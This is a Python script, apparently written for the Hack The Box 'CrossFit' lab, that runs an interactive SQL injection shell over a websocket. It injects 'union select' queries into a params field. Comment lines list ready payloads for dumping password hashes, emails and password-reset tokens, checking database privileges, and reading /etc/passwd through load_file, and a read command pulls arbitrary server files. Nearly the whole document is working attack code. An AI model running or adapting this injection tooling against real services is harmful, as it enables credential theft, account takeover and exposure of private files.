#commands:

# Get Hashes && emails  :  select group_concat(username,":",password,":",email,"\n")  from employees.employees
# Get token 		:  select group_concat(email,":",token,":",expires,"\n")  from employees.password_reset
# Check privileges 	:  select group_concat(grantee, ":",privilege_type) from information_schema.user_privileges
# read files		:  select load_file("/etc/passwd")

import websocket
from cmd import Cmd
import json

class Term(Cmd):
    prompt = "Injection=> "
    
    def __init__(self):
        self.connect()
        Cmd.__init__(self)  # Call the constructor of the Cmd class
        self.completekey = "tab"  # Set the completekey attribute
    
    def connect(self):
        self.ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
        data = json.loads(self.ws.recv())
        self.token = data["token"]
       
    def send_ws(self, params):
        msg = {}
        msg['message'] = "available"
        #msg['params'] = params #Normal params
        msg['params'] = f"3 union select ({params}),2"
        msg['token'] = self.token
        try:
            (self.ws).send(json.dumps(msg))
        except:
            self.connect()
            (self.ws).send(json.dumps(msg))
        data = self.ws.recv()
        data = json.loads(data)
        self.token = data["token"]
        return (data["debug"])[5:-10]
        
    def default(self, args):
        try:
            print(self.send_ws(args))
        except:
            self.connect()
            print(self.send_ws(args))
    
    def do_read(self, args):
        payload = f'select load_file("{args}")'
        try:
            print(self.send_ws(payload))
        except:
            self.connect()
            print(self.send_ws(payload))
    
    def do_exit(self, args):
        return True
        
term = Term()
term.cmdloop()

